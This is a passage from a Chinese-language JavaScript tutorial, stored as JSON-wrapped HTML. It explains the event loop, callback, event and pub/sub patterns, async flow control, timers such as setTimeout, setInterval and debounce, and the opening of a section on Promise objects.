queue），里面是各种需要当前程序处理的异步任务。（实际上，根据异步任务的类型，存在多个任务队列。为了方便理解，这里假设只存在一个队列。）</p>\n<p>首先，主线程会去执行所有的同步任务。等到同步任务全部执行完，就会去看任务队列里面的异步任务。如果满足条件，那么异步任务就重新进入主线程开始执行，这时它就变成同步任务了。等到执行完，下一个异步任务再进入主线程开始执行。一旦任务队列清空，程序就结束执行。</p>\n<p>异步任务的写法通常是回调函数。一旦异步任务重新进入主线程，就会执行对应的回调函数。如果一个异步任务没有回调函数，就不会进入任务队列，也就是说，不会重新进入主线程，因为没有用回调函数指定下一步的操作。</p>\n<p>JavaScript 引擎怎么知道异步任务有没有结果，能不能进入主线程呢？答案就是引擎在不停地检查，一遍又一遍，只要同步任务执行完了，引擎就会去检查那些挂起来的异步任务，是不是可以进入主线程了。这种循环检查的机制，就叫做事件循环（Event Loop）。<a href=\"http://en.wikipedia.org/wiki/Event_loop\">维基百科</a>的定义是：“事件循环是一个程序结构，用于等待和发送消息和事件（a programming construct that waits for and dispatches events or messages in a program）”。</p>\n\n        <h2>\n            <a href='#异步操作的模式' class='header-anchor'>#</a>\n            <span>异步操作的模式</span>\n        </h2>\n    <p>下面总结一下异步操作的几种模式。</p>\n\n        <h3>\n            <a href='#回调函数' class='header-anchor'>#</a>\n            <span>回调函数</span>\n        </h3>\n    <p>回调函数是异步操作最基本的方法。</p>\n<p>下面是两个函数<code>f1</code>和<code>f2</code>，编程的意图是<code>f2</code>必须等到<code>f1</code>执行完成，才能执行。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f1() {\n  // ...\n}\n\nfunction f2() {\n  // ...\n}\n\nf1();\nf2();</code></pre><p>上面代码的问题在于，如果<code>f1</code>是异步操作，<code>f2</code>会立即执行，不会等到<code>f1</code>结束再执行。</p>\n<p>这时，可以考虑改写<code>f1</code>，把<code>f2</code>写成<code>f1</code>的回调函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f1(callback) {\n  // ...\n  callback();\n}\n\nfunction f2() {\n  // ...\n}\n\nf1(f2);</code></pre><p>回调函数的优点是简单、容易理解和实现，缺点是不利于代码的阅读和维护，各个部分之间高度<a href=\"http://en.wikipedia.org/wiki/Coupling_(computer_programming)\">耦合</a>（coupling），使得程序结构混乱、流程难以追踪（尤其是多个回调函数嵌套的情况），而且每个任务只能指定一个回调函数。</p>\n\n        <h3>\n            <a href='#事件监听' class='header-anchor'>#</a>\n            <span>事件监听</span>\n        </h3>\n    <p>另一种思路是采用事件驱动模式。异步任务的执行不取决于代码的顺序，而取决于某个事件是否发生。</p>\n<p>还是以<code>f1</code>和<code>f2</code>为例。首先，为<code>f1</code>绑定一个事件（这里采用的 jQuery 的<a href=\"http://api.jquery.com/on/\">写法</a>）。</p>\n<pre class=\"prettyprint language-javascript\"><code>f1.on(&#039;done&#039;, f2);</code></pre><p>上面这行代码的意思是，当<code>f1</code>发生<code>done</code>事件，就执行<code>f2</code>。然后，对<code>f1</code>进行改写：</p>\n<pre class=\"prettyprint language-javascript\"><code>function f1() {\n  setTimeout(function () {\n    // ...\n    f1.trigger(&#039;done&#039;);\n  }, 1000);\n}</code></pre><p>上面代码中，<code>f1.trigger(&#39;done&#39;)</code>表示，执行完成后，立即触发<code>done</code>事件，从而开始执行<code>f2</code>。</p>\n<p>这种方法的优点是比较容易理解，可以绑定多个事件，每个事件可以指定多个回调函数，而且可以”<a href=\"http://en.wikipedia.org/wiki/Decoupling\">去耦合</a>“（decoupling），有利于实现模块化。缺点是整个程序都要变成事件驱动型，运行流程会变得很不清晰。阅读代码的时候，很难看出主流程。</p>\n\n        <h3>\n            <a href='#发布/订阅' class='header-anchor'>#</a>\n            <span>发布/订阅</span>\n        </h3>\n    <p>事件完全可以理解成”信号“，如果存在一个”信号中心“，某个任务执行完成，就向信号中心”发布“（publish）一个信号，其他任务可以向信号中心”订阅“（subscribe）这个信号，从而知道什么时候自己可以开始执行。这就叫做”<a href=\"http://en.wikipedia.org/wiki/Publish-subscribe_pattern\">发布/订阅模式</a>”（publish-subscribe pattern），又称“<a href=\"http://en.wikipedia.org/wiki/Observer_pattern\">观察者模式</a>”（observer pattern）。</p>\n<p>这个模式有多种<a href=\"http://msdn.microsoft.com/en-us/magazine/hh201955.aspx\">实现</a>，下面采用的是 Ben Alman 的 <a href=\"https://gist.github.com/661855\">Tiny Pub/Sub</a>，这是 jQuery 的一个插件。</p>\n<p>首先，<code>f2</code>向信号中心<code>jQuery</code>订阅<code>done</code>信号。</p>\n<pre class=\"prettyprint language-javascript\"><code>jQuery.subscribe(&#039;done&#039;, f2);</code></pre><p>然后，<code>f1</code>进行如下改写。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f1() {\n  setTimeout(function () {\n    // ...\n    jQuery.publish(&#039;done&#039;);\n  }, 1000);\n}</code></pre><p>上面代码中，<code>jQuery.publish(&#39;done&#39;)</code>的意思是，<code>f1</code>执行完成后，向信号中心<code>jQuery</code>发布<code>done</code>信号，从而引发<code>f2</code>的执行。</p>\n<p><code>f2</code>完成执行后，可以取消订阅（unsubscribe）。</p>\n<pre class=\"prettyprint language-javascript\"><code>jQuery.unsubscribe(&#039;done&#039;, f2);</code></pre><p>这种方法的性质与“事件监听”类似，但是明显优于后者。因为可以通过查看“消息中心”，了解存在多少信号、每个信号有多少订阅者，从而监控程序的运行。</p>\n\n        <h2>\n            <a href='#异步操作的流程控制' class='header-anchor'>#</a>\n            <span>异步操作的流程控制</span>\n        </h2>\n    <p>如果有多个异步操作，就存在一个流程控制的问题：如何确定异步操作执行的顺序，以及如何保证遵守这种顺序。</p>\n<pre class=\"prettyprint language-javascript\"><code>function async(arg, callback) {\n  console.log(&#039;参数为 &#039; + arg +&#039; , 1秒后返回结果&#039;);\n  setTimeout(function () { callback(arg * 2); }, 1000);\n}</code></pre><p>上面代码的<code>async</code>函数是一个异步任务，非常耗时，每次执行需要1秒才能完成，然后再调用回调函数。</p>\n<p>如果有六个这样的异步任务，需要全部完成后，才能执行最后的<code>final</code>函数。请问应该如何安排操作流程？</p>\n<pre class=\"prettyprint language-javascript\"><code>function final(value) {\n  console.log(&#039;完成: &#039;, value);\n}\n\nasync(1, function(value){\n  async(value, function(value){\n    async(value, function(value){\n      async(value, function(value){\n        async(value, function(value){\n          async(value, final);\n        });\n      });\n    });\n  });\n});</code></pre><p>上面代码中，六个回调函数的嵌套，不仅写起来麻烦，容易出错，而且难以维护。</p>\n\n        <h3>\n            <a href='#串行执行' class='header-anchor'>#</a>\n            <span>串行执行</span>\n        </h3>\n    <p>我们可以编写一个流程控制函数，让它来控制异步任务，一个任务完成以后，再执行另一个。这就叫串行执行。</p>\n<pre class=\"prettyprint language-javascript\"><code>var items = [ 1, 2, 3, 4, 5, 6 ];\nvar results = [];\n\nfunction async(arg, callback) {\n  console.log(&#039;参数为 &#039; + arg +&#039; , 1秒后返回结果&#039;);\n  setTimeout(function () { callback(arg * 2); }, 1000);\n}\n\nfunction final(value) {\n  console.log(&#039;完成: &#039;, value);\n}\n\nfunction series(item) {\n  if(item) {\n    async( item, function(result) {\n      results.push(result);\n      return series(items.shift());\n    });\n  } else {\n    return final(results[results.length - 1]);\n  }\n}\n\nseries(items.shift());</code></pre><p>上面代码中，函数<code>series</code>就是串行函数，它会依次执行异步任务，所有任务都完成后，才会执行<code>final</code>函数。<code>items</code>数组保存每一个异步任务的参数，<code>results</code>数组保存每一个异步任务的运行结果。</p>\n<p>注意，上面的写法需要六秒，才能完成整个脚本。</p>\n\n        <h3>\n            <a href='#并行执行' class='header-anchor'>#</a>\n            <span>并行执行</span>\n        </h3>\n    <p>流程控制函数也可以是并行执行，即所有异步任务同时执行，等到全部完成以后，才执行<code>final</code>函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>var items = [ 1, 2, 3, 4, 5, 6 ];\nvar results = [];\n\nfunction async(arg, callback) {\n  console.log(&#039;参数为 &#039; + arg +&#039; , 1秒后返回结果&#039;);\n  setTimeout(function () { callback(arg * 2); }, 1000);\n}\n\nfunction final(value) {\n  console.log(&#039;完成: &#039;, value);\n}\n\nitems.forEach(function(item) {\n  async(item, function(result){\n    results.push(result);\n    if(results.length === items.length) {\n      final(results[results.length - 1]);\n    }\n  })\n});</code></pre><p>上面代码中，<code>forEach</code>方法会同时发起六个异步任务，等到它们全部完成以后，才会执行<code>final</code>函数。</p>\n<p>相比而言，上面的写法只要一秒，就能完成整个脚本。这就是说，并行执行的效率较高，比起串行执行一次只能执行一个任务，较为节约时间。但是问题在于如果并行的任务较多，很容易耗尽系统资源，拖慢运行速度。因此有了第三种流程控制方式。</p>\n\n        <h3>\n            <a href='#并行与串行的结合' class='header-anchor'>#</a>\n            <span>并行与串行的结合</span>\n        </h3>\n    <p>所谓并行与串行的结合，就是设置一个门槛，每次最多只能并行执行<code>n</code>个异步任务，这样就避免了过分占用系统资源。</p>\n<pre class=\"prettyprint language-javascript\"><code>var items = [ 1, 2, 3, 4, 5, 6 ];\nvar results = [];\nvar running = 0;\nvar limit = 2;\n\nfunction async(arg, callback) {\n  console.log(&#039;参数为 &#039; + arg +&#039; , 1秒后返回结果&#039;);\n  setTimeout(function () { callback(arg * 2); }, 1000);\n}\n\nfunction final(value) {\n  console.log(&#039;完成: &#039;, value);\n}\n\nfunction launcher() {\n  while(running &lt; limit &amp;&amp; items.length &gt; 0) {\n    var item = items.shift();\n    async(item, function(result) {\n      results.push(result);\n      running--;\n      if(items.length &gt; 0) {\n        launcher();\n      } else if(running == 0) {\n        final(results);\n      }\n    });\n    running++;\n  }\n}\n\nlauncher();</code></pre><p>上面代码中，最多只能同时运行两个异步任务。变量<code>running</code>记录当前正在运行的任务数，只要低于门槛值，就再启动一个新的任务，如果等于<code>0</code>，就表示所有任务都执行完了，这时就执行<code>final</code>函数。</p>\n<p>这段代码需要三秒完成整个脚本，处在串行执行和并行执行之间。通过调节<code>limit</code>变量，达到效率和资源的最佳平衡。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"异步操作","link":"javascript:void(0)"},{"title":"定时器","link":"/async/timer.html"}],"content":"\n        <h1>\n            <a href='#定时器' class='header-anchor'>#</a>\n            <span>定时器</span>\n        </h1>\n    <p>JavaScript 提供定时执行代码的功能，叫做定时器（timer），主要由<code>setTimeout()</code>和<code>setInterval()</code>这两个函数来完成。它们向任务队列添加定时任务。</p>\n\n        <h2>\n            <a href='#setTimeout()' class='header-anchor'>#</a>\n            <span>setTimeout()</span>\n        </h2>\n    <p><code>setTimeout</code>函数用来指定某个函数或某段代码，在多少毫秒之后执行。它返回一个整数，表示定时器的编号，以后可以用来取消这个定时器。</p>\n<pre class=\"prettyprint language-javascript\"><code>var timerId = setTimeout(func|code, delay);</code></pre><p>上面代码中，<code>setTimeout</code>函数接受两个参数，第一个参数<code>func|code</code>是将要推迟执行的函数名或者一段代码，第二个参数<code>delay</code>是推迟执行的毫秒数。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(1);\nsetTimeout(&#039;console.log(2)&#039;,1000);\nconsole.log(3);\n// 1\n// 3\n// 2</code></pre><p>上面代码会先输出1和3，然后等待1000毫秒再输出2。注意，<code>console.log(2)</code>必须以字符串的形式，作为<code>setTimeout</code>的参数。</p>\n<p>如果推迟执行的是函数，就直接将函数名，作为<code>setTimeout</code>的参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {\n  console.log(2);\n}\n\nsetTimeout(f, 1000);</code></pre><p><code>setTimeout</code>的第二个参数如果省略，则默认为0。</p>\n<pre class=\"prettyprint language-javascript\"><code>setTimeout(f)\n// 等同于\nsetTimeout(f, 0)</code></pre><p>除了前两个参数，<code>setTimeout</code>还允许更多的参数。它们将依次传入推迟执行的函数（回调函数）。</p>\n<pre class=\"prettyprint language-javascript\"><code>setTimeout(function (a,b) {\n  console.log(a + b);\n}, 1000, 1, 1);</code></pre><p>上面代码中，<code>setTimeout</code>共有4个参数。最后那两个参数，将在1000毫秒之后回调函数执行时，作为回调函数的参数。</p>\n<p>还有一个需要注意的地方，如果回调函数是对象的方法，那么<code>setTimeout</code>使得方法内部的<code>this</code>关键字指向全局环境，而不是定义时所在的那个对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\n\nvar obj = {\n  x: 2,\n  y: function () {\n    console.log(this.x);\n  }\n};\n\nsetTimeout(obj.y, 1000) // 1</code></pre><p>上面代码输出的是1，而不是2。因为当<code>obj.y</code>在1000毫秒后运行时，<code>this</code>所指向的已经不是<code>obj</code>了，而是全局环境。</p>\n<p>为了防止出现这个问题，一种解决方法是将<code>obj.y</code>放入一个函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\n\nvar obj = {\n  x: 2,\n  y: function () {\n    console.log(this.x);\n  }\n};\n\nsetTimeout(function () {\n  obj.y();\n}, 1000);\n// 2</code></pre><p>上面代码中，<code>obj.y</code>放在一个匿名函数之中，这使得<code>obj.y</code>在<code>obj</code>的作用域执行，而不是在全局作用域内执行，所以能够显示正确的值。</p>\n<p>另一种解决方法是，使用<code>bind</code>方法，将<code>obj.y</code>这个方法绑定在<code>obj</code>上面。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\n\nvar obj = {\n  x: 2,\n  y: function () {\n    console.log(this.x);\n  }\n};\n\nsetTimeout(obj.y.bind(obj), 1000)\n// 2</code></pre>\n        <h2>\n            <a href='#setInterval()' class='header-anchor'>#</a>\n            <span>setInterval()</span>\n        </h2>\n    <p><code>setInterval</code>函数的用法与<code>setTimeout</code>完全一致，区别仅仅在于<code>setInterval</code>指定某个任务每隔一段时间就执行一次，也就是无限次的定时执行。</p>\n<pre class=\"prettyprint language-javascript\"><code>var i = 1\nvar timer = setInterval(function() {\n  console.log(2);\n}, 1000)</code></pre><p>上面代码中，每隔1000毫秒就输出一个2，会无限运行下去，直到关闭当前窗口。</p>\n<p>与<code>setTimeout</code>一样，除了前两个参数，<code>setInterval</code>方法还可以接受更多的参数，它们会传入回调函数。</p>\n<p>下面是一个通过<code>setInterval</code>方法实现网页动画的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var div = document.getElementById(&#039;someDiv&#039;);\nvar opacity = 1;\nvar fader = setInterval(function() {\n  opacity -= 0.1;\n  if (opacity &gt;= 0) {\n    div.style.opacity = opacity;\n  } else {\n    clearInterval(fader);\n  }\n}, 100);</code></pre><p>上面代码每隔100毫秒，设置一次<code>div</code>元素的透明度，直至其完全透明为止。</p>\n<p><code>setInterval</code>的一个常见用途是实现轮询。下面是一个轮询 URL 的 Hash 值是否发生变化的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var hash = window.location.hash;\nvar hashWatcher = setInterval(function() {\n  if (window.location.hash != hash) {\n    updatePage();\n  }\n}, 1000);</code></pre><p><code>setInterval</code>指定的是“开始执行”之间的间隔，并不考虑每次任务执行本身所消耗的时间。因此实际上，两次执行之间的间隔会小于指定的时间。比如，<code>setInterval</code>指定每 100ms 执行一次，每次执行需要 5ms，那么第一次执行结束后95毫秒，第二次执行就会开始。如果某次执行耗时特别长，比如需要105毫秒，那么它结束后，下一次执行就会立即开始。</p>\n<p>为了确保两次执行之间有固定的间隔，可以不用<code>setInterval</code>，而是每次执行结束后，使用<code>setTimeout</code>指定下一次执行的具体时间。</p>\n<pre class=\"prettyprint language-javascript\"><code>var i = 1;\nvar timer = setTimeout(function f() {\n  // ...\n  timer = setTimeout(f, 2000);\n}, 2000);</code></pre><p>上面代码可以确保，下一次执行总是在本次执行结束之后的2000毫秒开始。</p>\n\n        <h2>\n            <a href='#clearTimeout()，clearInterval()' class='header-anchor'>#</a>\n            <span>clearTimeout()，clearInterval()</span>\n        </h2>\n    <p><code>setTimeout</code>和<code>setInterval</code>函数，都返回一个整数值，表示计数器编号。将该整数传入<code>clearTimeout</code>和<code>clearInterval</code>函数，就可以取消对应的定时器。</p>\n<pre class=\"prettyprint language-javascript\"><code>var id1 = setTimeout(f, 1000);\nvar id2 = setInterval(f, 1000);\n\nclearTimeout(id1);\nclearInterval(id2);</code></pre><p>上面代码中，回调函数<code>f</code>不会再执行了，因为两个定时器都被取消了。</p>\n<p><code>setTimeout</code>和<code>setInterval</code>返回的整数值是连续的，也就是说，第二个<code>setTimeout</code>方法返回的整数值，将比第一个的整数值大1。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {}\nsetTimeout(f, 1000) // 10\nsetTimeout(f, 1000) // 11\nsetTimeout(f, 1000) // 12</code></pre><p>上面代码中，连续调用三次<code>setTimeout</code>，返回值都比上一次大了1。</p>\n<p>利用这一点，可以写一个函数，取消当前所有的<code>setTimeout</code>定时器。</p>\n<pre class=\"prettyprint language-javascript\"><code>(function() {\n  var gid = setInterval(clearAllTimeouts, 0);\n\n  function clearAllTimeouts() {\n    var id = setTimeout(function() {}, 0);\n    while (id &gt; 0) {\n      if (id !== gid) {\n        clearTimeout(id);\n      }\n      id--;\n    }\n  }\n})();</code></pre><p>上面代码中，先调用<code>setTimeout</code>，得到一个计算器编号，然后把编号比它小的计数器全部取消。</p>\n\n        <h2>\n            <a href='#实例：debounce-函数' class='header-anchor'>#</a>\n            <span>实例：debounce 函数</span>\n        </h2>\n    <p>有时，我们不希望回调函数被频繁调用。比如，用户填入网页输入框的内容，希望通过 Ajax 方法传回服务器，jQuery 的写法如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>$(&#039;textarea&#039;).on(&#039;keydown&#039;, ajaxAction);</code></pre><p>这样写有一个很大的缺点，就是如果用户连续击键，就会连续触发<code>keydown</code>事件，造成大量的 Ajax 通信。这是不必要的，而且很可能产生性能问题。正确的做法应该是，设置一个门槛值，表示两次 Ajax 通信的最小间隔时间。如果在间隔时间内，发生新的<code>keydown</code>事件，则不触发 Ajax 通信，并且重新开始计时。如果过了指定时间，没有发生新的<code>keydown</code>事件，再将数据发送出去。</p>\n<p>这种做法叫做 debounce（防抖动）。假定两次 Ajax 通信的间隔不得小于2500毫秒，上面的代码可以改写成下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>$(&#039;textarea&#039;).on(&#039;keydown&#039;, debounce(ajaxAction, 2500));\n\nfunction debounce(fn, delay){\n  var timer = null; // 声明计时器\n  return function() {\n    var context = this;\n    var args = arguments;\n    clearTimeout(timer);\n    timer = setTimeout(function () {\n      fn.apply(context, args);\n    }, delay);\n  };\n}</code></pre><p>上面代码中，只要在2500毫秒之内，用户再次击键，就会取消上一次的定时器，然后再新建一个定时器。这样就保证了回调函数之间的调用间隔，至少是2500毫秒。</p>\n\n        <h2>\n            <a href='#运行机制' class='header-anchor'>#</a>\n            <span>运行机制</span>\n        </h2>\n    <p><code>setTimeout</code>和<code>setInterval</code>的运行机制，是将指定的代码移出本轮事件循环，等到下一轮事件循环，再检查是否到了指定时间。如果到了，就执行对应的代码；如果不到，就继续等待。</p>\n<p>这意味着，<code>setTimeout</code>和<code>setInterval</code>指定的回调函数，必须等到本轮事件循环的所有同步任务都执行完，才会开始执行。由于前面的任务到底需要多少时间执行完，是不确定的，所以没有办法保证，<code>setTimeout</code>和<code>setInterval</code>指定的任务，一定会按照预定时间执行。</p>\n<pre class=\"prettyprint language-javascript\"><code>setTimeout(someTask, 100);\nveryLongTask();</code></pre><p>上面代码的<code>setTimeout</code>，指定100毫秒以后运行一个任务。但是，如果后面的<code>veryLongTask</code>函数（同步任务）运行时间非常长，过了100毫秒还无法结束，那么被推迟运行的<code>someTask</code>就只有等着，等到<code>veryLongTask</code>运行结束，才轮到它执行。</p>\n<p>再看一个<code>setInterval</code>的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>setInterval(function () {\n  console.log(2);\n}, 1000);\n\nsleep(3000);\n\nfunction sleep(ms) {\n  var start = Date.now();\n  while ((Date.now() - start) &lt; ms) {\n  }\n}</code></pre><p>上面代码中，<code>setInterval</code>要求每隔1000毫秒，就输出一个2。但是，紧接着的<code>sleep</code>语句需要3000毫秒才能完成，那么<code>setInterval</code>就必须推迟到3000毫秒之后才开始生效。注意，生效后<code>setInterval</code>不会产生累积效应，即不会一下子输出三个2，而是只会输出一个2。</p>\n\n        <h2>\n            <a href='#setTimeout(f,-0)' class='header-anchor'>#</a>\n            <span>setTimeout(f, 0)</span>\n        </h2>\n    \n        <h3>\n            <a href='#含义' class='header-anchor'>#</a>\n            <span>含义</span>\n        </h3>\n    <p><code>setTimeout</code>的作用是将代码推迟到指定时间执行，如果指定时间为<code>0</code>，即<code>setTimeout(f, 0)</code>，那么会立刻执行吗？</p>\n<p>答案是不会。因为上一节说过，必须要等到当前脚本的同步任务，全部处理完以后，才会执行<code>setTimeout</code>指定的回调函数<code>f</code>。也就是说，<code>setTimeout(f, 0)</code>会在下一轮事件循环一开始就执行。</p>\n<pre class=\"prettyprint language-javascript\"><code>setTimeout(function () {\n  console.log(1);\n}, 0);\nconsole.log(2);\n// 2\n// 1</code></pre><p>上面代码先输出<code>2</code>，再输出<code>1</code>。因为<code>2</code>是同步任务，在本轮事件循环执行，而<code>1</code>是下一轮事件循环执行。</p>\n<p>总之，<code>setTimeout(f, 0)</code>这种写法的目的是，尽可能早地执行<code>f</code>，但是并不能保证立刻就执行<code>f</code>。</p>\n\n        <h3>\n            <a href='#应用' class='header-anchor'>#</a>\n            <span>应用</span>\n        </h3>\n    <p><code>setTimeout(f, 0)</code>有几个非常重要的用途。它的一大应用是，可以调整事件的发生顺序。比如，网页开发中，某个事件先发生在子元素，然后冒泡到父元素，即子元素的事件回调函数，会早于父元素的事件回调函数触发。如果，想让父元素的事件回调函数先发生，就要用到<code>setTimeout(f, 0)</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;input type=&quot;button&quot; id=&quot;myButton&quot; value=&quot;click&quot;&gt;\n\nvar input = document.getElementById(&#039;myButton&#039;);\n\ninput.onclick = function A() {\n  setTimeout(function B() {\n    input.value +=&#039; input&#039;;\n  }, 0)\n};\n\ndocument.body.onclick = function C() {\n  input.value += &#039; body&#039;\n};</code></pre><p>上面代码在点击按钮后，先触发回调函数<code>A</code>，然后触发函数<code>C</code>。函数<code>A</code>中，<code>setTimeout</code>将函数<code>B</code>推迟到下一轮事件循环执行，这样就起到了，先触发父元素的回调函数<code>C</code>的目的了。</p>\n<p>另一个应用是，用户自定义的回调函数，通常在浏览器的默认动作之前触发。比如，用户在输入框输入文本，<code>keypress</code>事件会在浏览器接收文本之前触发。因此，下面的回调函数是达不到目的的。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;input type=&quot;text&quot; id=&quot;input-box&quot;&gt;\n\ndocument.getElementById(&#039;input-box&#039;).onkeypress = function (event) {\n  this.value = this.value.toUpperCase();\n}</code></pre><p>上面代码想在用户每次输入文本后，立即将字符转为大写。但是实际上，它只能将本次输入前的字符转为大写，因为浏览器此时还没接收到新的文本，所以<code>this.value</code>取不到最新输入的那个字符。只有用<code>setTimeout</code>改写，上面的代码才能发挥作用。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.getElementById(&#039;input-box&#039;).onkeypress = function() {\n  var self = this;\n  setTimeout(function() {\n    self.value = self.value.toUpperCase();\n  }, 0);\n}</code></pre><p>上面代码将代码放入<code>setTimeout</code>之中，就能使得它在浏览器接收到文本之后触发。</p>\n<p>由于<code>setTimeout(f, 0)</code>实际上意味着，将任务放到浏览器最早可得的空闲时段执行，所以那些计算量大、耗时长的任务，常常会被放到几个小部分，分别放到<code>setTimeout(f, 0)</code>里面执行。</p>\n<pre class=\"prettyprint language-javascript\"><code>var div = document.getElementsByTagName(&#039;div&#039;)[0];\n\n// 写法一\nfor (var i = 0xA00000; i &lt; 0xFFFFFF; i++) {\n  div.style.backgroundColor = &#039;#&#039; + i.toString(16);\n}\n\n// 写法二\nvar timer;\nvar i=0x100000;\n\nfunction func() {\n  timer = setTimeout(func, 0);\n  div.style.backgroundColor = &#039;#&#039; + i.toString(16);\n  if (i++ == 0xFFFFFF) clearTimeout(timer);\n}\n\ntimer = setTimeout(func, 0);</code></pre><p>上面代码有两种写法，都是改变一个网页元素的背景色。写法一会造成浏览器“堵塞”，因为 JavaScript 执行速度远高于 DOM，会造成大量 DOM 操作“堆积”，而写法二就不会，这就是<code>setTimeout(f, 0)</code>的好处。</p>\n<p>另一个使用这种技巧的例子是代码高亮的处理。如果代码块很大，一次性处理，可能会对性能造成很大的压力，那么将其分成一个个小块，一次处理一块，比如写成<code>setTimeout(highlightNext, 50)</code>的样子，性能压力就会减轻。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"异步操作","link":"javascript:void(0)"},{"title":"Promise 对象","link":"/async/promise.html"}],"content":"\n        <h1>\n            <a href='#Promise-对象' class='header-anchor'>#</a>\n            <span>Promise 对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>Promise 对象是 JavaScript 的异步操作解决方案，为异步操作提供统一接口。它起到代理作用（proxy），充当异步操作与回调函数之间的中介，使得异步操作具备同步操作的接口。Promise 可以让异步操作写起来，就像在写同步操作的流程，而不必一层层地嵌套回调函数。</p>\n<p>注意，本章只是 Promise 对象的简单介绍。为了避免与后续教程的重复，更完整的介绍请看<a href=\"http://es6.ruanyifeng.com/\">《ES6 标准入门》</a>的<a href=\"http://es6.ruanyifeng.com/#docs/promise\">《Promise 对象》</a>一章。</p>\n<p>首先，Promise 是一个对象，也是一个构造函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f1(resolve, reject) {\n  // 异步代码...\n}\n\nvar p1 = new Promise(f1);</code></pre><p>上面代码中，<code>Promise</code>构造函数接受一个回调函数<code>f1</code>作为参数，<code>f1</code>里面是异步操作的代码。然后，返回的<code>p1</code>就是一个 Promise 实例。</p>\n<p>Promise 的设计思想是，所有异步任务都返回一个 Promise 实例。Promise 实例有一个<code>then</code>方法，用来指定下一步的回调函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>var p1 = new Promise(f1);\np1.then(f2);</code></pre><p>上面代码中，<code>f1</code>的异步操作执行完成，就会执行<code>f2</code>。</p>\n<p>传统的写法可能需要把<code>f2</code>作为回调函数传入<code>f1</code>，比如写成<code>f1(f2)</code>，异步操作完成后，在<code>f1</code>内部调用<code>f2</code>。Promise 使得<code>f1</code>和<code>f2</code>变成了链式写法。不仅改善了可读性，而且对于多层嵌套的回调函数尤其方便。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 传统写法\nstep1(function (value1) {\n  step2(value1, function(value2) {\n    step3(value2, function(value3) {\n      step4(value3, function(value4) {\n        // ...\n      });\n    });\n  });\n});\n\n// Promise 的写法\n(new Promise(step1))\n  .then(step2)\n  .then(step3)\n  .then(step4);</code></pre><p>从上面代码可以看到，采用 Promises 以后，程序流程变得非常清楚，十分易读。注意，为了便于理解，上面代码的<code>Promise</code>实例的生成格式，做了简化，真正的语法请参照下文。</p>\n<p>总的来说，传统的回调函数写法使得代码混成一团，变得横向发展而不是向下发展。Promise 就是解决这个问题，使得异步流程可以写成同步流程。</p>\n<p>Promise 原本只是社区提出的一个构想，一些函数库率先实现了这个功能。ECMAScript 6 将其写入语言标准，目前 JavaScript 原生支持 Promise 对象。</p>\n\n        <h2>\n            <a href='#Promise-对象的状态' class='header-anchor'>#</a>\n            <span>Promise 对象的状态</span>\n        </h2>\n    <p>Promise 对象通过自身的状态，来控制异步操作。Promise 实例具有三种状态。</p>\n<ul>\n<li>异步操作未完成（pending）</li>\n<li>异步操作成功（fulfilled）</li>\n<li>异步操作失败（rejected）</li>\n</ul>\n<p>上面三种状态里面，<code>fulfilled</code>和<code>rejected</code>合在一起称为<code>resolved</code>（已定型）。</p>\n<p>这三种的状态的变化途径只有两种。</p>\n<ul>\n<li>从“未完成”到“成功”</li>\n<li>从“未完成”到“失败”</li>\n</ul>\n<p>一旦状态发生变化，就凝固了，不会再有新的状态变化。这也是 Promise 这个名字的由来，它的英语意思是“承诺”，一旦承诺成效，就不得再改变了。这也意味着，Promise 实例的状态变化只可能发生一次。</p>\n<p>因此，Promise 的最终结果只有两种。</p>\n<ul>\n<li>异步操作成功，Promise 实例传回一个值（value），状态变为<code>fulfilled</code>。</li>\n<li>异步操作失败，Promise 实例抛出一个错误（error），状态变为<code>rejected</code>。</li>\n</ul>\n\n        <h2>\n            <a href='#Promise-构造函数' class='header-anchor'>#</a>\n            <span>Promise 构造函数</span>\n        </h2>\n    <p>JavaScript 提供原生的<code>Promise</code>构造函数，用来生成 Promise 实例。</p>\n<pre class=\"prettyprint language-javascript\"><code>var promise = new Promise(function (resolve, reject) {\n  // ...\n\n  if (/* 异步操作成功 */){\n    resolve(value);\n  } else { /* 异步操作失败 */\n    reject(new Error());\n  }\n});</code></pre><p>上面代码中，<code>Promise</code>构造函数接受一个函数作为参数，该函数的两个参数分别是<code>resolve</code>和<code>reject</code>。它们是两个函数，由 JavaScript 引擎提供，不用自己实现。</p>\n<p><code>resolve</code>函数的作用是，将<code>Promise</code>实例的状态从“未完成”变为“成功”（即从<code>pending</code>变为<code>fulfilled</code>），在异步操作成功时调用，并将异步操作的结果，作为参数传递出去。<code>reject</code>函数的作用是，将<code>Promise</code>实例的状态从“未完成”变为“失败”（即从<code>pending</code>变为<code>rejected</code>），在异步操作失败时调用，并将异步操作报出的错误，作为参数传递出去。</p>\n<p>下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>function timeout(ms) {\n  return new Promise((resolve, reject) =&gt; {\n    setTimeout(resolve, ms, &#039;done&#039;);\n  });\n}\n\ntimeout(100)</code></pre><p>上面代码中，<code>timeout(100)</code>返回一个 Promise 实例。100毫秒以后，该实例的状态会变为<code>fulfilled</code>。</p>\n\n        <h2>\n            <a href='#Promise.prototype.then()' 